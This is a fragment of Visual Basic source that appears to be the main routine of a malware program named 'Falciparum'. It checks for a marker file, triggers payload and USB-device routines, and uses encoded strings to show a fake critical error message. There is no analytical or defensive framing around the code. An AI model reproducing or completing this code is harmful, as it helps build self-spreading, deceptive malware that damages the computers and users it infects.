Attribute VB_Name = "Falciparum"
Public Sub Main()
On Error Resume Next
If Not FILE_EXISTS(UF(Fav) + Ec("ž¹´»ëêö¼¹¬")) Then 'Falc32.dat
        Call Config
        Call ChkPayload
        Else
        Call DetectUSBDevice
        Call ChkPayload
        MsgBox Ec("Ž±·´¹»±+¶ø¼½ø½«»ª±¬­ª¹ø½¶øè èèžáàœ‹’ëàôø‘µ¨·«±º´½ø»·¶¬±¶­¹ªö"), vbCritical, Ec("¨¹¿½¾±´½ö«¡«")
        End If
End Sub
